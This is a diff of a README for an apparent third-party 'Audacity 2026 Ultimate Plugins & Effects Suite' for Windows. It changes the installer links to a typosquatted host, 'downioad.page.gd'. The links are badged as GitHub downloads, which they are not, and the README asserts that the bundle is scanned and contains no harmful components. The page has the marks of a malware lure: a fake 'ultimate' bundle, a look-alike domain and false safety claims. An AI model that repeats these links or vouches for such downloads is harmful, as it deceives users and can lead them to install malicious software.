@@ -2,7 +2,7 @@
 
 The Audacity 2026 Ultimate Plugins & Effects Suite is a dedicated mod for Windows desktop users, designed to transform your audio editing experience with Audacity. This package brings together a variety of plugins and effects that extend Audacity's core functionality, making it ideal for both beginners and professionals seeking to produce high-quality audio projects on Windows 10 and Windows 11.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -56,7 +56,7 @@ Absolutely. The bundle is scanned for security and contains no harmful component
 
 To access the latest release of the Audacity 2026 Plugins & Effects Bundle, please visit the download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Additional Notes
 
